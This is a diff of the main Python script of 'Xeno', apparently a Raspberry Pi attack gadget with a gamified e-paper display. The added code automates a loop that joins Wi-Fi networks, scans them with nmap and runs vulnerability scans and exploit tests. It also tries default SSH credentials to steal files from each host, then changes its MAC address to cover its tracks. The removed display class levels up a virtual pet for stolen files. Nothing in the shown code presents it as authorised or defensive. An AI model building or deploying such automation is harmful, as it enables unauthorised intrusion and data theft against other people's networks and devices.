@@ -1,322 +1,474 @@
-import sys
 import os
-import json
-from datetime import datetime
-# Add paths for drivers and assets
-sys.path.append('/home/pi/xeno/utils/waveshare_epd')
-sys.path.append('/home/pi/xeno/utils')
+import time
 import logging
-from PIL import Image, ImageDraw, ImageFont, ImageEnhance
-from waveshare_epd import epd2in13_V4
+# Suppress debug logs from Pillow (PIL)
+logging.getLogger("PIL").setLevel(logging.WARNING)
+from wifi.wifi_manager import WiFiManager
+from utils.logger import Logger
+from scans.nmap_scanner import run_nmap_scan
+from utils.html_logger import HTMLLogger
+from attacks.recon import Recon
+from attacks.vulnerability_scan import VulnerabilityScanner
+from attacks.exploit_tester import ExploitTester
+from attacks.file_stealer import FileStealer
+from utils.display import EPaperDisplay
+from utils.image_state_manager import ImageStateManager
+import subprocess
 
-# Logging setup
-logging.basicConfig(level=logging.DEBUG)
+def load_ssh_credentials():
+    """
+    Load SSH credentials from predefined paths in the project directory.
 
-# File to save state
-STATE_FILE = "state.json"
+    Searches in the following order:
+        - /home/pi/xeno/config/ssh_default_credentials.txt
+        - /root/ssh_default_credentials.txt
 
-class EPaperDisplay:
+    Returns:
+        list: A list of dictionaries with SSH credentials, where each dictionary contains:
+            - username (str): The username for SSH login.
+            - password (str): The password for SSH login.
 
-    def __init__(self):
-        """
-        Initialize the EPaperDisplay class.
+    Raises:
+        Exception: If the file cannot be read or is improperly formatted.
+    """
 
-        Attributes:
-            epd (EPD): An instance of the Waveshare e-paper display driver.
-            width (int): The width of the e-paper display in pixels.
-            height (int): The height of the e-paper display in pixels.
-            age (int): The age of the display usage in days.
-            level (int): The current level for the display (calculated dynamically).
-            start_date (str or None): The start date of the display's usage, formatted as "YYYY-MM-DD".
-
-        Workflow:
-            - Loads the saved state if available, otherwise initializes with default values.
-        """
-
-        self.epd = epd2in13_V4.EPD()
-        self.width = 122  # Display width
-        self.height = 250  # Display height
-        self.age = 0  # Age in days
-        self.level = 1
-        self.start_date = None
-        self.pet_name = "Xeno"  # Default name if not set in state
-        self.load_state()  # Load saved state
-        logging.info("EPaperDisplay initialized.")
-
-    def load_state(self):
-        """
-        Load the saved display state from a JSON file.
-
-        Reads the state from `state.json`, which includes:
-            - level: The current level for the display.
-            - start_date: The start date of the display's usage.
-
-        Calculates the `age` of the display based on the `start_date`.
-
-        Raises:
-            Exception: If the state file cannot be read or is improperly formatted.
-        """
-
-        if os.path.exists(STATE_FILE):
+    potential_paths = [
+        "/home/pi/xeno/config/ssh_default_credentials.txt",
+        "/root/ssh_default_credentials.txt"
+    ]
+    for path in potential_paths:
+        if os.path.exists(path):
+            print(f"[INFO] Found SSH credentials at: {path}")
+            credentials = []
             try:
-                with open(STATE_FILE, "r") as f:
-                    state = json.load(f)
-                    self.level = state.get("level", 1)
-                    self.start_date = state.get("start_date", None)
-                    self.pet_name = state.get("pet_name", "Xeno")
-
-                    # Calculate age based on start_date
-                    if self.start_date:
-                        start_date_obj = datetime.strptime(self.start_date, "%Y-%m-%d")
-                        self.age = (datetime.now() - start_date_obj).days
-                    else:
-                        self.age = 0
-
-                    logging.info(f"State loaded: {state}")
+                with open(path, "r") as file:
+                    for line in file:
+                        line = line.strip()
+                        if line and ":" in line:
+                            username, password = line.split(":", 1)
+                            credentials.append({"username": username, "password": password})
+                return credentials
             except Exception as e:
-                logging.error(f"Error loading state file: {e}")
+                print(f"[ERROR] Failed to load SSH credentials from {path}: {e}")
+                return []
+    print("[ERROR] No SSH credentials file found in config or root.")
+    return []
+
+def load_wifi_credentials():
+    """
+    Load Wi-Fi credentials from predefined paths in the project directory.
+
+    Searches in the following order:
+        - /home/pi/xeno/config/wifi_credentials.json
+        - /root/wifi_credentials.json
+
+    Returns:
+        list: A list of dictionaries with Wi-Fi credentials, where each dictionary contains:
+            - SSID (str): The Wi-Fi network name.
+            - Password (str): The Wi-Fi network password.
+
+    Raises:
+        Exception: If the file cannot be read or is improperly formatted.
+    """
+
+    potential_paths = [
+        "/home/pi/xeno/config/wifi_credentials.json",
+        "/root/wifi_credentials.json"
+    ]
+    for path in potential_paths:
+        if os.path.exists(path):
+            print(f"[INFO] Found Wi-Fi credentials at: {path}")
+            try:
+                import json
+                with open(path, "r") as file:
+                    return json.load(file)
+            except Exception as e:
+                print(f"[ERROR] Failed to load Wi-Fi credentials from {path}: {e}")
+                return []
+    print("[ERROR] No Wi-Fi credentials file found in config or root.")
+    return []
+
+def initialize_display_template(display, current_ssid="Not Connected", stats=None):
+    """
+    Initialize the e-paper display with a basic template.
+
+    Parameters:
+        display (EPaperDisplay): The e-paper display object to update.
+        current_ssid (str): The name of the current Wi-Fi network (default: "Not Connected").
+        stats (dict): A dictionary with stats on targets, vulnerabilities, exploits, and files.
+
+    Default Stats:
+        - targets: 0
+        - vulns: 0
+        - exploits: 0
+        - files: 0
+
+    Raises:
+        Exception: If an error occurs during initialization or image rendering.
+"""
+
+    if stats is None:
+        stats = {"targets": 0, "vulns": 0, "exploits": 0, "files": 0}  # Default stats
+    try:
+        from PIL import Image
+        placeholder_image = Image.new('1', (60, 60), color=255)  # Blank image
+        prepared_image = display.prepare_image(placeholder_image)
+        layout = display.draw_layout(prepared_image, current_ssid=current_ssid, current_status="Initializing...", stats=stats)
+        display.display_image(layout, use_partial_update=False)  # Full refresh for initialization
+        print("[INFO] Template initialized.")
+    except Exception as e:
+        print(f"[ERROR] Failed to initialize display template: {e}")
+
+def update_display_state(self, state_manager, state, current_ssid="SSID",
+                         current_status="", stats=None, use_partial_update=True):
+    """
+    Update the e-paper display with the current workflow state.
+
+    Parameters:
+        self (EPaperDisplay): The e-paper display object to update.
+        state_manager (ImageStateManager): Manages workflow states and images.
+        state (str): The current workflow state (e.g., "scanning", "analyzing").
+        current_ssid (str): The name of the current Wi-Fi network.
+        current_status (str): The current status message to display.
+        stats (dict): A dictionary with stats on targets, vulnerabilities, exploits, and files.
+        use_partial_update (bool): Whether to perform a partial refresh (default: True).
+
+    Raises:
+        Exception: If the display update fails.
+"""
+
+    if stats is None:
+        stats = {"targets": 0, "vulns": 0, "exploits": 0, "files": 0}
+
+    try:
+        # Log the current state and refresh mode
+        logging.info(f"Updating display: state={state}, partial_refresh={use_partial_update}")
+
+        # Update workflow state and load corresponding image and message
+        state_manager.set_state(state)
+        image, xeno_message = state_manager.get_image_and_message_for_current_state()
+        prepared_image = self.prepare_image(image)
+
+        # Initialize the display in the correct mode
+        if use_partial_update:
+            # Partial refresh does not require reinitialization
+            logging.debug("Partial refresh mode: Skipping reinitialization.")
         else:
-            # First run, initialize start date
-            self.start_date = datetime.now().strftime("%Y-%m-%d")
-            logging.info("No saved state found. Initializing with current date.")
+            # Full refresh requires initialization to default mode
+            self.initialize(partial_refresh=False)
 
-    def save_state(self):
-        """
-        Save the current display state to a JSON file.
+        # Combine the current status with the Xenomorph message
+        full_status = f"{current_status}\n{xeno_message}"
 
-        Writes the following attributes to `state.json`:
-            - level: The current level for the display.
-            - start_date: The start date of the display's usage.
+        # Render layout and update display
+        layout = self.draw_layout(prepared_image, current_ssid=current_ssid,
+                                  current_status=full_status, stats=stats)
+        self.display_image(layout, use_partial_update=use_partial_update)
 
-        Raises:
-            Exception: If the state file cannot be written or an error occurs during saving.
-        """
+        # Log success
+        logging.info(f"State updated successfully: {state}, partial_refresh={use_partial_update}")
+    except Exception as e:
+        logging.error(f"Failed to update display: {e}")
 
-        try:
-            state = {
-                "level": self.level,
-                "start_date": self.start_date,
-                "pet_name": self.pet_name
-            }
-            with open(STATE_FILE, "w") as f:
-                json.dump(state, f)
-                logging.info(f"State saved: {state}")
-        except Exception as e:
-            logging.error(f"Error saving state file: {e}")
+def run_scans(logger, wifi_manager, html_logger, display, state_manager):
+    """
+    Perform the scanning and processing logic for the workflow.
 
-    def initialize(self, partial_refresh=False):
-        """
-        Initialize the e-paper display.
+    Parameters:
+        logger (Logger): Logger for recording workflow progress.
+        wifi_manager (WiFiManager): Manages Wi-Fi connections.
+        html_logger (HTMLLogger): Generates HTML logs of scan results.
+        display (EPaperDisplay): Updates the e-paper display.
+        state_manager (ImageStateManager): Manages workflow states and images.
 
-        Parameters:
-            partial_refresh (bool): Whether to initialize the display for partial refresh mode.
-                                    Defaults to False (full refresh mode).
+    Workflow:
+        1. Initializes the display with default stats.
+        2. Loads Wi-Fi and SSH credentials.
+        3. Connects to Wi-Fi networks and performs scans.
+        4. Runs reconnaissance, vulnerability scans, and exploit testing.
+        5. Attempts file-stealing on discovered devices.
+        6. Updates the e-paper display dynamically with results.
 
-        Workflow:
-            - Initializes the display in the specified refresh mode.
-            - Clears the display screen.
+    Raises:
+        Exception: If any critical errors occur during scanning.
+"""
 
-        Raises:
-            Exception: If the initialization process fails.
-        """
+    stats = {"targets": 0, "vulns": 0, "exploits": 0, "files": 0}  # Initialize stats
 
-        try:
-            if partial_refresh:
-                logging.info("Initializing for partial refresh.")
-                self.epd.init_fast()  # Use partial refresh mode
+    # Full refresh for the initial template
+    initialize_display_template(display, current_ssid="Not Connected", stats=stats)
+
+    wifi_credentials = load_wifi_credentials()
+    if not wifi_credentials:
+        logger.log("[ERROR] No Wi-Fi credentials loaded. Ensure the file exists in either config or root.")
+        return
+
+    ssh_credentials = load_ssh_credentials()
+    if not ssh_credentials:
+        logger.log("[ERROR] No SSH credentials loaded. Ensure the file exists in either config or root.")
+        return
+
+    connected_ssid = None  # Track the currently connected SSID
+
+    for network in wifi_credentials:
+        ssid = network.get("SSID")
+        password = network.get("Password")
+
+        if not ssid or not password:
+            continue
+
+        # Skip reconnection if already connected to the same SSID
+        if connected_ssid == ssid:
+            logger.log(f"[INFO] Already connected to SSID: {ssid}. Skipping reconnection.")
+        else:
+            wifi_manager.disconnect_wifi()
+
+            for attempt in range(3):
+                # Partial refresh for connecting to Wi-Fi
+                update_display_state(
+                    display,
+                    state_manager,
+                    "scanning",
+                    current_ssid=ssid,
+                    current_status="Connecting to Wi-Fi",
+                    stats=stats,
+                    use_partial_update=True
+                )
+                logger.log(f"[INFO] Attempting to connect to SSID: {ssid} (Attempt {attempt + 1}/3)")
+                if wifi_manager.connect_to_wifi(ssid, password):
+                    logger.log(f"[SUCCESS] Connected to SSID: {ssid}")
+                    connected_ssid = ssid
+                    break
             else:
-                logging.info("Initializing for full refresh.")
-                self.epd.init()  # Use full refresh mode
-            self.epd.Clear(0xFF)  # Clear the screen
-        except Exception as e:
-            logging.error(f"Failed to initialize display: {e}")
-            raise
+                logger.log(f"[WARNING] Failed to connect to SSID: {ssid}.")
+                update_display_state(
+                    display,
+                    state_manager,
+                    "fallback",
+                    current_ssid=ssid,
+                    current_status="Connection failed. Retrying next...",
+                    stats=stats,
+                    use_partial_update=True
+                )
+                continue
 
-    def prepare_image(self, image):
-        """
-        Resize and process an image to fit the e-paper display.
+        # Run Nmap scan
+        logger.log(f"[INFO] Running nmap scan for network: {ssid}")
+        update_display_state(
+            display,
+            state_manager,
+            "analyzing",
+            current_ssid=ssid,
+            current_status="Scanning the network",
+            stats=stats,
+            use_partial_update=True
+        )
+        scan_result = run_nmap_scan("192.168.1.0/24", logger=logger)
+        stats["targets"] += len(scan_result["discovered_ips"])  # Increment Targets
+        html_logger.save_scan_result_to_json(ssid, scan_result["raw_output"])
 
-        Parameters:
-            image (PIL.Image): The input image to be resized and processed.
+        # Recon Phase
+        recon = Recon(logger=logger)
+        parsed_devices = []  # List to store structured device data
 
-        Returns:
-            PIL.Image: The processed image, resized to fit the display dimensions and converted
-                       to a 1-bit black-and-white format with dithering.
-
-        Raises:
-            Exception: If an error occurs during image processing.
-        """
-
-        try:
-            # Resize the image
-            resized_image = image.resize((90, 90), resample=Image.LANCZOS)
-            # Convert to 1-bit black and white with dithering
-            processed_image = resized_image.convert('1', dither=Image.FLOYDSTEINBERG)
-            logging.info("Image prepared for display.")
-            return processed_image
-        except Exception as e:
-            logging.error(f"Error preparing image: {e}")
-            raise
-
-    def calculate_level(self, stats):
-        """
-        Calculate the level dynamically based on cumulative stats.
-
-        Parameters:
-            stats (dict): A dictionary containing performance metrics, including:
-                - targets (int): The number of targets discovered.
-                - vulns (int): The number of vulnerabilities identified.
-                - exploits (int): The number of exploits executed.
-                - files (int): The number of files successfully stolen.
-
-        Workflow:
-            - Computes the total score based on stats and updates the level.
-            - The level threshold increases with each level.
-
-        Raises:
-            KeyError: If any required key is missing from the `stats` dictionary.
-        """
-
-        try:
-            # Calculate total score for the cycle
-            cycle_score = (
-                stats["targets"] * 10 +
-                stats["vulns"] * 20 +
-                stats["exploits"] * 30 +
-                stats["files"] * 5
+        for ip in scan_result["discovered_ips"]:
+            update_display_state(
+                display,
+                state_manager,
+                "reconnaissance",
+                current_ssid=ssid,
+                current_status=f"Scanning IP {ip}",
+                stats=stats,
+                use_partial_update=True
             )
 
-            # Determine the threshold for leveling up
-            level_threshold = self.level * 100  # Threshold increases with level
-            while cycle_score >= level_threshold:
-                self.level += 1
-                cycle_score -= level_threshold
-                level_threshold = self.level * 125  # Update threshold for next level
-        except KeyError as e:
-            logging.error(f"Missing key in stats: {e}")
-            raise
-
-    def draw_layout(self, image, current_ssid="Not Connected", current_status="Initializing...", stats=None):
-            """
-            Draw a custom layout for the e-paper display.
-
-            Parameters:
-                image (PIL.Image): The Xeno image to display.
-                current_ssid (str): The name of the current Wi-Fi network. Defaults to "Not Connected".
-                current_status (str): The current status message to display. Defaults to "Initializing...".
-                stats (dict, optional): A dictionary containing performance metrics, including:
-                    - targets (int): Number of targets discovered (default: 0).
-                    - vulns (int): Number of vulnerabilities identified (default: 0).
-                    - exploits (int): Number of exploits executed (default: 0).
-                    - files (int): Number of files successfully stolen (default: 0).
-
-            Returns:
-                PIL.Image: The final layout image with all elements rendered.
-
-            Raises:
-                Exception: If any error occurs during the rendering of the layout.
-            """
-
-            if stats is None:
-                stats = {"targets": 0, "vulns": 0, "exploits": 0, "files": 0}
-
-            try:
-                # Update level
-                self.calculate_level(stats)
-
-                # Create a blank canvas for the display
-                canvas = Image.new('1', (self.width, self.height), 255)  # 255 = White background
-                draw = ImageDraw.Draw(canvas)
-
-                # Add a border
-                border_offset = 1
-                draw.rectangle(
-                    (border_offset, border_offset, self.width - border_offset, self.height - border_offset),
-                    outline=0,  # Black border
-                    width=1
-                )
-
-                # Top bar with SSID
-                draw.rectangle((0, 0, self.width, 20), fill=0)  # Black background
-                font_small = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf', 8)
-                draw.text(xy=(5, 2), text=f"SSID: {current_ssid}", font=font_small, fill=255)  # White text for SSID
-
-                # Section separators
-                draw.line((0, 20, self.width, 20), fill=0, width=1)
-                draw.line((0, 45, self.width, 45), fill=0, width=1)
-                draw.line((0, 95, self.width, 95), fill=0, width=1)
-
-                # Stats Section
-                font_stats = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf', 8)
-                draw.text(xy=(5, 25), text=f"Targets: {stats['targets']}", font=font_stats, fill=0)
-                draw.text(xy=(75, 25), text=f"Vulns: {stats['vulns']}", font=font_stats, fill=0)
-                draw.text(xy=(5, 35), text=f"Exploits: {stats['exploits']}", font=font_stats, fill=0)
-                draw.text(xy=(75, 35), text=f"Files: {stats['files']}", font=font_stats, fill=0)
-
-                # Current status INSIDE the blank box
-                font_body = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf', 8)
-                draw.text(xy=(40, 50), text="Status:", font=font_body, fill=0)
-                draw.text(xy=(5, 65), text=current_status, font=font_body, fill=0)
-
-                # Pet Name Section
-                font_body = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf', 8)
-                draw.text(xy=(35, 100), text=f"{self.pet_name}", font=font_body, fill=0)
-
-                # Age and Level
-                draw.text(xy=(5, 110), text=f"Age: {self.age} days", font=font_body, fill=0)
-                draw.text(xy=(75, 110), text=f"Level: {self.level}", font=font_body, fill=0)
-
-                # Bottom Section: Xeno Image
-                canvas.paste(image, (17, 150))  # Paste the dynamic Xeno image
-                logging.info("Dynamic layout drawn successfully.")
-
-                # Save the updated state
-                self.save_state()
-                return canvas
-            except Exception as e:
-                logging.error(f"Error drawing layout: {e}")
-                raise
-
-    def display_image(self, canvas, use_partial_update=True):
-        """
-        Display the given image on the e-paper display.
-
-        Parameters:
-            canvas (PIL.Image): The prepared layout image to display.
-            use_partial_update (bool): Whether to use partial refresh mode. Defaults to True.
-
-        Raises:
-            Exception: If an error occurs during the display update process.
-        """
-
-        try:
-            buffer = self.epd.getbuffer(canvas)
-            if use_partial_update:
-                logging.debug("Using partial refresh...")
-                self.epd.displayPartial(buffer)  # Call the working partial refresh method
+            # Detect OS during reconnaissance
+            os_detected = recon.detect_os(ip)
+            if "timed out" in scan_result.get("raw_output", "") or os_detected is None:
+                logger.log(f"[ERROR] OS detection returned None for IP {ip}. Defaulting to 'Unknown'.")
+                os_type = "Timeout"
             else:
-                logging.debug("Using full refresh...")
-                self.epd.display(buffer)  # Call the full refresh method
-        except Exception as e:
-            logging.error(f"Failed to display image: {e}")
-            raise
+                os_type = os_detected
 
-    def clear(self):
-        """
-        Clear the e-paper display and put it into sleep mode.
+            # Parse devices from raw Nmap result
+            for line in scan_result["raw_output"].split("\n"):
+                if f"Nmap scan report for {ip}" in line:
+                    # Extract MAC address, vendor, and IP
+                    mac_address = "Unknown"
+                    vendor = "Unknown"
+                    next_lines = scan_result["raw_output"].split("\n")
+                    for next_line in next_lines:
+                        if "MAC Address" in next_line:
+                            mac_address = next_line.split(" ")[2].strip()
+                            vendor = " ".join(next_line.split(" ")[3:]).strip("()")
+                            break
 
-        Workflow:
-            - Clears the display screen to a blank state.
-            - Puts the display hardware into low-power sleep mode.
+                    # Append structured data
+                    parsed_devices.append({
+                        "ip": ip,
+                        "mac": mac_address,
+                        "vendor": vendor,
+                        "os_version": os_type
+                    })
 
-        Raises:
-            Exception: If an error occurs during the clearing or sleep process.
-        """
+        # Save parsed devices to the JSON file
+        scan_result["devices"] = parsed_devices
+        html_logger.save_scan_result_to_json(ssid, scan_result)
 
-        try:
-            self.epd.Clear()
-            self.epd.sleep()
-            logging.info("E-paper display cleared and set to sleep mode.")
-        except Exception as e:
-            logging.error(f"Error clearing display: {e}")
-            raise
+        # Vulnerability Scan Phase
+        vuln_scanner = VulnerabilityScanner(logger=logger)
+        vulnerabilities = {}
+        for ip in scan_result["discovered_ips"]:
+            update_display_state(
+                display,
+                state_manager,
+                "investigating",
+                current_ssid=ssid,
+                current_status="Running vulnerability scan",
+                stats=stats,
+                use_partial_update=True
+            )
+            vuln_results = vuln_scanner.run_scan(ip, ssid=ssid, html_logger=html_logger)
+            if vuln_results:
+                stats["vulns"] += len(vuln_results)
+                vulnerabilities[ip] = vuln_results
+
+        # Exploit Testing Phase
+        exploit_tester = ExploitTester(logger=logger)
+        for ip, vuln_data in vulnerabilities.items():
+            for vuln in vuln_data["vulnerabilities"]:
+                logger.log(f"[INFO] Running exploit testing on IP: {ip} for vulnerability: {vuln}")
+                update_display_state(
+                    display,
+                    state_manager,
+                    "attacking",
+                    current_ssid=ssid,
+                    current_status="Running exploit tests",
+                    stats=stats,
+                    use_partial_update=True
+                )
+                exploit_tester.run_exploit_testing(
+                    service_data=vuln,
+                    target_ip=ip,
+                    ssid=ssid,
+                    html_logger=html_logger,
+                )
+                update_display_state(
+                    display,
+                    state_manager,
+                    "validating",
+                    current_ssid=ssid,
+                    current_status="Validating exploit results...",
+                    stats=stats,
+                    use_partial_update=True
+                )
+                stats["exploits"] += 1
+
+        # File Stealing Phase
+        file_stealer = FileStealer(logger=logger)
+        for ip in vulnerabilities.keys():
+            update_display_state(
+                display,
+                state_manager,
+                "attacking",
+                current_ssid=ssid,
+                current_status="Stealing files",
+                stats=stats,
+                use_partial_update=True
+            )
+            successful = False
+            for creds in ssh_credentials:
+                # Pass OS type to the file stealer
+                if file_stealer.steal_files(
+                    target_ip=ip,
+                    username=creds["username"],
+                    password=creds["password"],
+                    os_type=os_type
+                ):
+                    successful = True
+                    stats["files"] += 3  # Increment files per successful steal
+                    break
+
+            if successful:
+                logger.log(f"[SUCCESS] File stealing successful for IP: {ip}")
+                wifi_manager.disconnect_wifi()
+                connected_ssid = None  # Reset connected SSID after disconnecting
+                change_mac_address(logger)
+
+    # Full refresh after workflow completion
+    update_display_state(
+        display,
+        state_manager,
+        "success",
+        current_ssid="Completed Network",
+        current_status="Workflow Complete",
+        stats=stats,
+        use_partial_update=False  # Full refresh to clear any ghosting
+    )
+
+def change_mac_address(logger):
+    """
+    Change the MAC address of the `wlan0` interface.
+
+    Parameters:
+        logger (Logger): Logger for recording progress and errors.
+
+    Workflow:
+        1. Brings the `wlan0` interface down.
+        2. Uses `macchanger` to randomly set a new MAC address.
+        3. Brings the interface back up.
+
+    Raises:
+        subprocess.CalledProcessError: If any command fails during the process.
+"""
+
+    try:
+        logger.log("[INFO] Changing MAC address for wlan0.")
+        subprocess.run(["sudo", "ifconfig", "wlan0", "down"], check=True)
+        subprocess.run(["sudo", "macchanger", "-r", "wlan0"], check=True)
+        subprocess.run(["sudo", "ifconfig", "wlan0", "up"], check=True)
+        logger.log("[SUCCESS] MAC address changed successfully.")
+    except subprocess.CalledProcessError as e:
+        logger.log(f"[ERROR] Failed to change MAC address: {str(e)}")
+
+def main():
+    """
+    The main entry point for the Xeno project.
+
+    Initializes the following components:
+        - Logger: Handles logging for the application.
+        - WiFiManager: Manages Wi-Fi connections.
+        - HTMLLogger: Logs scan results in HTML format.
+        - EPaperDisplay: Manages the e-paper display updates.
+        - ImageStateManager: Tracks and manages workflow states and images.
+
+    Workflow:
+        1. Initializes display and loads required credentials.
+        2. Continuously performs scans and updates results.
+        3. Logs workflow progress and handles any exceptions.
+
+    Raises:
+        Exception: If a critical error occurs during initialization or execution.
+    """
+    os.makedirs("logs", exist_ok=True)
+    logger = Logger(log_file="logs/scan.log")
+    wifi_manager = WiFiManager(logger=logger)
+    html_logger = HTMLLogger(output_dir="utils/html_logs", json_dir="utils/json_logs")
+    display = EPaperDisplay()
+    state_manager = ImageStateManager()
+
+    try:
+        display.initialize()
+        while True:
+            logger.log("[INFO] Starting new scanning cycle.")
+            run_scans(logger, wifi_manager, html_logger, display, state_manager)
+            logger.log("[INFO] Scanning cycle completed. Sleeping for 10 minutes.")
+            time.sleep(600)  # Sleep for 10 minutes
+    except Exception as e:
+        logger.log(f"[ERROR] Fatal error occurred: {e}")
+    finally:
+        display.clear()  # Display is cleared
+        print("[INFO] E-paper display cleared.")
+
+if __name__ == "__main__":
+    main()
